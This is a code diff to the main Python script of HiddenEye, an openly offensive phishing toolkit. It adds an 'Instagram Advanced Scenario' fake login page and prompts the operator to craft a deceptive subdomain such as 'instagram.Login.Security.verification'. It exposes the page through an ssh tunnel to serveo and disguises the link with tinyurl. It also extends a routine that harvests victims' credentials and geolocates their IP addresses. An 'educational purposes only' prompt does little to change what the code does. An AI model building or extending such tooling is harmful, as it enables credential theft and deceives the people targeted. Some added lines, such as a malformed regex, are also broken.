@@ -6,8 +6,8 @@ from time import sleep
 import re
 import json
 from urllib.request import urlopen
-from subprocess import check_output
-from sys import stdout, argv
+from subprocess import check_output, CalledProcessError
+from sys import stdout, argv, exit
 from Defs.Configurations import readConfig, ifSettingsNotExists
 from Defs.Languages import *
 
@@ -68,6 +68,8 @@ def runPhishing(page , customOption): #Phishing pages selection menu
         copy_tree("WebPages/Instagram_web/", "Server/www/")
     elif customOption == '2' and page == 'Instagram':
         copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
+    elif customOption == '3' and page == 'Instagram':
+        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")    
     elif customOption == '1' and page == 'VK':
         copy_tree("WebPages/VK/", "Server/www/")
     elif customOption == '2' and page == 'VK':
@@ -102,11 +104,17 @@ def runNgrok():
             break
 
 def runServeo():
-    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > link.url 2> /dev/null &')
+    print(_("\n {0}[ YOU CAN MAKE A TRICKY URL LIKE ]  \n (http ://instagram.Login.Security.verification.serveo[.]net) \n\n\n {0}Insert a custom subdomain for serveo").format(RED, DEFAULT))
+    lnk = input(_("\n {0}CUSTOM Subdomain>>> {1}").format(RED, DEFAULT))
+    if not ".serveo.net" in lnk:
+        lnk += ".serveo.net"
+    else:
+        pass
+    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R %s:80:localhost:1111 serveo.net > link.url 2> /dev/null &' % (lnk))
     sleep(7)
     try:
-        output = check_output("grep -o 'https://[0-9a-z]*\.serveo.net' link.url",shell=True)
-        url = str(output).strip("b ' \ n")
+        output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
+        url = str(output).strip("b ' \ n r")
         print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
         data = urlopen("http://tinyurl.com/api-create.php?url="+url)
@@ -114,14 +122,13 @@ def runServeo():
         link = url.decode('utf-8')
         print("\n {0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
-    except subprocess.CalledProcessError:
-        print ('''
-  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
-      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
-      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
-          \|
+    except CalledProcessError:
+        print (_('''{1}
+        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
                     {0}[{1}!{0}]{1} Network error. Verify your connection.\n
-'''.format(RED, DEFAULT))
+''').format(RED, DEFAULT))
         exit(0)
 
 def runMainMenu(): #menu where user select what they wanna use
@@ -157,7 +164,8 @@ def runMainMenu(): #menu where user select what they wanna use
 
     for i in range(101):
         sleep(0.05)
-        stdout.write(_("\r{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
+        stdout.write("\r")
+        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
         stdout.flush()
 
     if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}").format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
@@ -195,7 +203,7 @@ def runMainMenu(): #menu where user select what they wanna use
         runPhishing('Twitter', customOption)
     elif option == '8':
         loadModule('Instagram')
-        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
+        customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
         runPhishing('Instagram', customOption)
     elif option == '9':
         loadModule('Snapchat')
@@ -301,6 +309,7 @@ def getCredentials():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
+                user = re.match('Current logged in user: (a-z0-9)\n', lines)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
